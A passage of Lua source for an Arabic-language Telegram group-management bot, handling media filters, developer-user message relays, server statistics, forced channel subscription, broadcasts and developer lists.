𖠀 𖠁 𖠂 𖠅 𖠆 𖠇 𖠈 𖠉 𖠍 𖠎 𖠏 𖠐 𖠑 𖠒 𖠓 𖠔 𖠕 𖠖 𖠗 𖠘 𖠙 𖠚 𖠛 𖠜 𖠝 𖠞 𖠟 𖠠 𖠡 𖠢 𖠣 𖠤 𖠥 𖠦 𖠧 𖠨 𖠩 𖠪 𖠫 𖠬 𖠭 𖠮 𖠯 𖠰 𖠱 𖠲 𖠳 𖠴 𖠵 𖠶 𖠷 𖠸 𖠹 𖠺 𖠻 𖠼 𖠽 𖠾 𖠿 𖡀 𖡁 𖡂 𖡃 𖡄 𖡅 𖡆 𖡇 𖡈 𖡉 𖡊 𖡋 𖡌 𖡍 𖡎 𖡏 𖡐 𖡑 𖡒 𖡓 𖡔 𖡕 𖡖 𖡗 𖡘 𖡙 𖡚 𖡛 𖡜 𖡝 𖡞 𖡟 𖡠 𖡡 𖡢 𖡣 𖡤 𖡥 𖡦 𖡧 𖡨 𖡩 𖡪 𖡫 𖡬 𖡭 𖡮 𖡯 𖡰 𖡱 𖡲 𖡳 𖡴 𖡵 𖡶 𖡷 𖡸 𖡹 𖡺 𖡻 𖡼 𖡽 𖡾 𖡿 𖢀 𖢁 𖢂 𖢃 𖢄 𖢅 𖢆 𖢇 𖢈 𖢉 𖢊 𖢋 𖢌 𖢍 𖢎 𖢏 𖢐 𖢑 𖢒 𖢓 𖢔 𖢕 𖢖 𖢗 𖢘 𖢙 𖢚 𖢛 𖢜 𖢝 𖢞 𖢟 𖢠 𖢡 𖢢 𖢣 𖢤 𖢥 𖢦 𖢧 𖢨 𖢩 𖢪 𖢫 𖢬 𖢭 𖢮 𖢯 𖢰 𖢱 𖢲 𖢳 𖢴 𖢵 𖢶 𖢷 𖢸 𖢹 𖢺 𖢻 𖢼 𖢽 𖢾 𖢿 𖣀 𖣁 𖣂 𖣃 𖣄 𖣅 ?? 𖣇 𖣈 𖣉 𖣊 𖣋 𖣌 𖣍 𖣎 𖣏 𖣐 𖣑 𖣒 𖣓 𖣔 𖣕 𖣖 𖣗 𖣘 𖣙 𖣚 𖣛 𖣜 𖣝 𖣞 𖣟 𖣠 𖣡 𖣢 𖣣 𖣤 𖣥 𖣦 𖣧 𖣨 𖣩 𖣪 𖣫 𖣬 𖣭 𖣮 𖣯 𖣰 𖣱 𖣲 𖣳 𖣴 𖣵 𖣶 𖣷 𖣸 𖣹 𖣺 𖣻 𖣼 𖣽 𖣾 𖣿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ' معرفة المزيد ؟',url="t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ارقام جاهزة 🔢' then
Text = [[
*₁ ₂ ₃ ₄ ₅ ₆ ₇ ₈ ₉ ₀
↞??↞ ✦┇❷ ✦┇✦┇❸ ✦┇✦┇❹ •✦┇❺ ✦┇𝟔 𝟕 ?? 𝟗 ✦┇⓿ •
𝟭 𝟮 𝟯 𝟰 𝟱 𝟲 𝟳 𝟴 𝟵 𝟬
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
⓵⓶⓷⓸⓹⑥⑦⑧⑨⓪
⓵⓶⓷⓸⓹❻❼❽❾⓿
⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
 𝟶 𝟷 𝟸 𝟹 𝟺 𝟻 𝟼 𝟽 𝟾  𝟿
 ? 𝟙  𝟚  𝟛  𝟜  𝟝  𝟞  𝟟  𝟠 𝟡
 𝟬 𝟭  𝟮  𝟯  𝟰  𝟱   𝟲  𝟳  𝟴  𝟵  
 ✦┇⓿ ✦┇ ✦┇❶ ✦┇ ✦┇❷ ✦┇ ✦┇❸ ✦┇ ✦┇❹ ✦┇ ✦┇❺ ✦┇  𝟔  𝟕   𝟖   𝟗
０ １ ２ ３ ４ ５ ６ ７８９
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ' معرفة المزيد ؟',url="t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text and text:match("^/start ph(.*)$") then
Sf = database:get(bot_id.."Neverland:Filter:msg")
local list = database:smembers(bot_id.."Neverland:List:Filter:Photo"..Sf)  
for k,v in pairs(list) do
if v then
inline = {
{{text = '- الغاء المنع .',callback_data="pito"..v}},
}
send_inline_Media(msg.chat_id_,"sendPhoto","photo",v,inline) 
end
end
if #list == 0 then
send(msg.chat_id_, msg.id_,"✦┇لا يوجد صور ممنوعه"  )  
end
Zs = {
{{text = '- اضغط هنا .',callback_data="delallph"..Sf}},
}
send_inlin_key(msg.chat_id_,"✦┇هل تريد اللغاء منع كل الصور؟",Zs,msg.id_)
end  
if text and text:match("^/start msg(.*)$") then
sl = text:match("^/start msg(.*)$")
local list = database:smembers(bot_id.."Neverland:List:Filter:text"..sl)
t = "\n✦┇قائمة الكلمات الممنوعه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
if v then
t = t..""..k.."- ["..v.."]\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد كلمات ممنوعه"  
end
send(msg.chat_id_, msg.id_,t)  
end  
if text and text:match("^/start gif(.*)$") then
Sf = text:match("^/start gif(.*)$")
local list = database:smembers(bot_id.."Neverland:List:Filter:Animation"..Sf)
for k,v in pairs(list) do
if v then
inline = {
{{text = '- الغاء المنع .',callback_data="animation"..v.."chatid"..Sf}},
}
send_inline_Media(msg.chat_id_,"sendanimation","animation",v,inline) 
end
end
if #list == 0 then
t = "✦┇لا يوجد متحركات ممنوعه"  
send(msg.chat_id_, msg.id_,t)  
end
ZsText = "✦┇هل تريد اللغاء منع كل المتحركات؟"
Zs = {
{{text = '- اضغط هنا .',callback_data="delallanimation"..Sf}},
}
send_inlin_key(msg.chat_id_,ZsText,Zs,msg.id_)
end  
if text and text:match("^/start Sti(.*)$") then
Sf = text:match("^/start Sti(.*)$")
local list = database:smembers(bot_id.."Neverland:List:Filter:Sticker"..Sf)
for k,v in pairs(list) do
if v then
inline = {
{{text = '- الغاء المنع .',callback_data="Sticker"..v.."chatid"..Sf}},
}
send_inline_Media(msg.chat_id_,"sendSticker","sticker",v,inline) 
end
end
if #list == 0 then
t = "✦┇لا يوجد ملصقات ممنوعه"  
send(msg.chat_id_, msg.id_,t)  
end
ZsText = "✦┇هل تريد اللغاء منع كل  الملصقات؟"
Zs = {
{{text = '- اضغط هنا .',callback_data="delallSticker"..Sf}},
}
send_inlin_key(msg.chat_id_,ZsText,Zs,msg.id_)
end
if not DevNeverland(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') and not database:get(bot_id.."Neverland:Filter"..msg.sender_user_id_) then
send(msg.sender_user_id_,msg.id_,'✦┇تمت ارسال رسالتك الى المطور')    
tdcli_function({ID ="GetChat",chat_id_=Id_Sudo},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=Id_Sudo,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,ta) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(Id_Sudo,'✦┇تم ارسال الملصق من ~ ['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if DevNeverland(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
sendText(Id_Sudo,'✦┇لشخص ↜ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n✦┇تم حظره من التواصل ',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'BaN:In:User',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
sendText(Id_Sudo,'✦┇الشخص ↜ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n✦┇تم الغاء حظره من التواصل ',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'BaN:In:User',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
send(msg.chat_id_, msg.id_,'\n✦┇فشل ارسال رسالتك لان العضو قام بحظر البوت') 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
Text = '✦┇تمت ارسال الرساله اليه .. '
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '✦┇تمت ارسال الملصق اليه .. '
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '✦┇تمت ارسال الصوره اليه .. '
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, msg.content_.animation_.animation_.persistent_id_)    
Text = '✦┇تمت ارسال المتحركه اليه .. '
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, msg.content_.voice_.voice_.persistent_id_)    
Text = '✦┇تمت ارسال البصمه اليه .. '
end     
sendText(Id_Sudo,Text..'\n'..'✦┇~ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);end,nil);end,nil);end,nil);end 
if DevNeverland(msg) then
if text == 'تفعيل التواصل ↞' then  
database:del(bot_id..'Texting:In:Bv') 
send(msg.chat_id_, msg.id_,'✦┇ تم تفعيل التواصل ') 
end
if text == 'تعطيل التواصل ↞' then  
database:set(bot_id..'Texting:In:Bv',true) 
send(msg.chat_id_, msg.id_,'✦┇ تم تعطيل التواصل ') 
end
if text == 'قناه تحديثات السورس ↞' then 
send(msg.chat_id_, msg.id_,' ✦┇[تحديثات ﭑݪسورس](https://t.me/DEV_Neverland) \n ✦┇[قناه ﭑݪسورس](https://t.me/TEAM_Neverland)')
end
if text == "المطور" or text == "مطور" then
local TEXT_Dev = database:get(bot_id..'Neverland:TEXT_Dev')
if TEXT_Dev then 
send(msg.chat_id_, msg.id_,TEXT_Dev)
else
tdcli_function ({ID = "GetUser",user_id_ = Dev,},function(arg,result) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Dev,offset_ = 0,limit_ = 1},function(arg,getpro) 
if getpro.photos_[0] then
Text = "*✦┇ Dev Name ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*✦┇ Dev User ↬* [@"..result.username_.."]\n*✦┇ Dev id ↬* ["..result.id_.."]"
keyboard = {}
keyboard.inline_keyboard = {{{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
send(msg.chat_id_, msg.id_,Name,1, 'md')
end
end,nil)   
end,nil)   
end
end
if text == 'معلومات السيرفر ↞' then
ioserver =  io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '• ⊱ { نظام التشغيل } ⊰✦┇\n*»» '"$linux_version"'*' 
echo '*------------------------------\n*✦┇⊱ { الذاكره العشوائيه } ⊰✦┇\n*»» '"$memUsedPrc"'*'
echo '*------------------------------\n*✦┇⊱ { وحـده الـتـخـزيـن } ⊰✦┇\n*»» '"$HardDisk"'*'
echo '*------------------------------\n*✦┇⊱ { الـمــعــالــج } ⊰✦┇\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '*------------------------------\n*✦┇⊱ { موقـع الـسـيـرفـر } ⊰✦┇\n*»» '`curl http://th3boss.com/ip/location`'*'
echo '*------------------------------\n*✦┇⊱ { الــدخــول } ⊰✦┇\n*»» '`whoami`'*'
echo '*------------------------------\n*✦┇⊱ { مـده تـشغيـل الـسـيـرفـر } ⊰✦┇\n*»» '"$uptime"'*'
]]):read('*all')
send(msg.chat_id_, msg.id_,ioserver)
return false
end
if text =='الاحصائيات ↞' then
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'Neverland:UsersBot')  
send(msg.chat_id_, msg.id_,'*✦┇احصائيات البوت* \n\n✦┇عدد المجموعات *~ '..Groups..'*\n✦┇عدد المشتركين ~* '..Users..'*')
end
if text == 'الاصدار ↞' then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✦┇اصدار سورس* نيفرلاند* لديك (*v3.0*) ↞')
end
if text == "اعادة التشغيل ↞" then  
dofile("Neverland.lua") 
dofile("sudo.lua")  
send(msg.chat_id_, msg.id_,"*✦┇Ok Done rested bot my dev ..*")
end
if text == "تنظيف المشتركين ↞" then
local pv = database:smembers(bot_id..'Neverland:UsersBot')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
print('\27[30;33m»» THE USER IS SAVE ME ↓\n»» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31m»» THE USER IS BLOCK ME ↓\n»» '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'Neverland:UsersBot',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'✦┇لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*✦┇عدد المشتركين الان ~ '..#pv..'\n✦┇تم العثور على ~ '..sendok..' مشترك قام بحظر البوت\n✦┇اصبح عدد المشتركين الان ~ '..ok..' مشترك *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات ↞" then
local group = database:smembers(bot_id..'Chek:Groups')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'✦┇لا توجد مجموعات وهميه ')   
else
local Alsh = (w + q)
local sendok = #group - Alsh
if q == 0 then
Alsh = ''
else
Alsh = '\n✦┇تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
local Neverland = ''
else
local Neverland = '\n✦┇تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*✦┇ عدد المجموعات الان ~ '..#group..' مجموعه '..Neverland..''..Alsh..'\n✦┇اصبح عدد المجموعات الان ~ '..sendok..' مجموعات*\n')   
end
end
end,nil)
end
return false
end
if text =='تغيير المطور الاساسي ↞' and VIP_DeV(msg) then
send(msg.chat_id_, msg.id_,'✦┇ارسل ايدي المطور الاساسي الجديد')
database:set(bot_id..'Neverland:Ed:DevBots',true) 
end
if text =='تغيير المطور الاساسي ↞' and not VIP_DeV(msg) then
send(msg.chat_id_, msg.id_,'✦┇تسرسح')
end
if VIP_DeV(msg) then
if text == "الاشتراك الاجباري ↞"  then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "✦┇تم تفعيل الاشتراك الاجباري \n✦┇على القناة ↜ ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "تفعيل الاشتراك الاجباري ↞"  then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_,"✦┇الاشتراك الاجباري مفعل \n✦┇على القناة ↜ ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"✦┇اهلا عزيزي المطور \n✦┇ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري ↞"  then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "✦┇تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == 'تغير الاشتراك ↞' then
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✦┇حسنآ ارسل لي معرف القناة')
return false  
end
if text == 'تغير رساله الاشتراك ↞' then
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✦┇حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ↞" then
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "✦┇تم مسح رساله الاشتراك ")
return false  
end
if text == 'تعين قناة الاشتراك ↞' then
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✦┇حسنآ ارسل لي معرف القناة')
return false  
end
end
if not VIP_DeV(msg) then
if text == "الاشتراك الاجباري ↞"  or text == "تفعيل الاشتراك الاجباري ↞"  or text == "تعطيل الاشتراك الاجباري ↞"  or text == 'تغير رساله الاشتراك ↞' or text == 'تغير الاشتراك ↞' or text == "حذف رساله الاشتراك ↞" or text == 'تعين قناة الاشتراك ↞' then
send(msg.chat_id_, msg.id_,'✦┇عذا الامر للمطور الاساسي فقط .')
end
end
if database:get(bot_id.."Neverland:Ed:DevBots") then
if text and text:match("^(%d+)$") then
local IdDe = text:match("^(%d+)$")
send(msg.chat_id_,msg.id_, "✦┇تم تحفظ المعلومات اضغط ( تحديث الملفات ✦┇) للتنفيذ")
local A = io.open("sudo.lua", 'w')
A:write([[
s = "B333BB"

q = "TEAM_Neverland"

token = "]]..token..[["

Sudo = ]]..IdDe..[[  
]])
A:close()
database:del(bot_id.."Neverland:Ed:DevBots")
end
end
if text == 'تفعيل البوت الخدمي ↞' then
database:del(bot_id..'Neverland:Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'\n✦┇تم تفعيل البوت الخدمي ') 
end
if text == 'تعطيل البوت الخدمي ↞' then
database:set(bot_id..'Neverland:Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'\n✦┇تم تعطيل البوت الخدمي') 
end
if text=="اذاعه خاص ↞" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\n✦┇للخروج ارسل الغاء ") 
return false
end 
if text=="اذاعه ↞" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\n✦┇للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه ↞" and msg.reply_to_message_id_ == 0  then
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص ↞" and msg.reply_to_message_id_ == 0  then
if database:get(bot_id.."Neverland:Status:Bc") and not DevNeverland(msg) then 
send(msg.chat_id_, msg.id_,"✦┇الاذاعه معطله من قبل المطور الاساسي")
return false
end
database:setex(bot_id.."Neverland:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي التوجيه الان") 
return false
end 
if text == "تفعيل الاذاعه ↞" then
database:del(bot_id.."Neverland:Status:Bc") 
send(msg.chat_id_, msg.id_,"\n✦┇تم تفعيل الاذاعه " ) 
return false
end 
if text == "تعطيل الاذاعه ↞" then
database:set(bot_id.."Neverland:Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\n✦┇تم تعطيل الاذاعه") 
return false
end 
if text == "تفعيل المغادره ↞" then
database:del(bot_id.."Neverland:Left:Bot"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✦┇تم تفعيل مغادرة البوت") 
return false 
end
if text == "تغير اسم البوت ↞"  then 
if DevNeverland(msg) then
database:setex(bot_id.."Neverland:Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"✦┇ارسل لي الاسم الان ")  
end
return false
end
if text == "تعطيل المغادره ↞" then
database:set(bot_id.."Neverland:Left:Bot"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "✦┇تم تعطيل مغادرة البوت") 
return false 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء ↞' then   
send(msg.chat_id_, msg.id_,"✦┇تم الغاء حفظ كليشه ستارت") 
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,'✦┇تم حفظ كليشه ستارت') 
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت ↞' then
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'✦┇ارسل لي الكليشه الان') 
return false
end
if text == 'حذف كليشه ستارت ↞' then
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'✦┇تم حذف كليشه ستارت') 
end
if msg.content_.ID == "MessageDocument" and database:get(bot_id..'docu:Bots') then    
local ID_FILE = msg.content_.document_.document_.persistent_id_ 
local File_Name = msg.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
database:del(bot_id..'docu:Bots') 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "✦┇تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '✦┇المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '✦┇عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'✦┇عذا لا يمكنك وضع معرف مجموعه بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'✦┇البوت ادمن في القناة \n✦┇تم تفعيل الاشتراك الاجباري في \n✦┇ايدي القناة ('..data.id_..')\n✦┇معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
database:set(bot_id..'add:ch:title',data.title_)
else
send(msg.chat_id_, msg.id_,'✦┇عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "✦┇تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,'✦┇تم تغيير رسالة الاشتراك ')
end
if text == ("مسح قائمه العام ↞") and DevNeverland(msg) then
database:del(bot_id.."Neverland:GBan:User")
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح قائمه العام")
return false
end
if text == ("مسح المطورين ↞") and DevNeverland(msg) then
database:del(bot_id.."Neverland:Sudo:User")
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح قائمة المطورين  ")
end
if text == ("قائمة العام ↞") and DevNeverland(msg) then
local list = database:smembers(bot_id.."Neverland:GBan:User")
t = "\n✦┇قائمة المحظورين عام \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("المطورين ↞") and DevNeverland(msg) then
local list = database:smembers(bot_id.."Neverland:Sudo:User")
t = "\n✦┇قائمة مطورين البوت \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("الثانويين ↞") then
local list = database:smembers(bot_id.."DEV:Sudo:T")
t = "\n✦┇قائمة مطورين الثانويين للبوت \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانويين ↞") and VIP_DeV(msg) then
database:del(bot_id.."DEV:Sudo:T")
send(msg.chat_id_, msg.id_, "*✦┇ تم مسح قائمة المطورين الثانويين*")
end
if text == ("مسح الثانويين ↞") and not VIP_DeV(msg) then
